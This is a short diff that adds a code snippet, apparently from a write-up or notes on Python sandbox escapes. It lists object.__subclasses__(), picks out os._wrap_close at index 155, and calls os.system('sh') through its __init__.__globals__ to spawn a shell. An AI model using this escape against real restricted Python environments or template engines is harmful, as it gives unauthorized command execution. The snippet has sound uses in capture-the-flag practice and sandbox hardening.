@@ -1,0 +1,9 @@
+```
+>> for i, c in enumerate(object.__subclasses__()):	print(f"{i}: {c}")
+
+...
+155: <class 'os._wrap_close'>
+...
+
+>> object.__subclasses__()[155].__init__.__globals__["system"]("sh")
+```
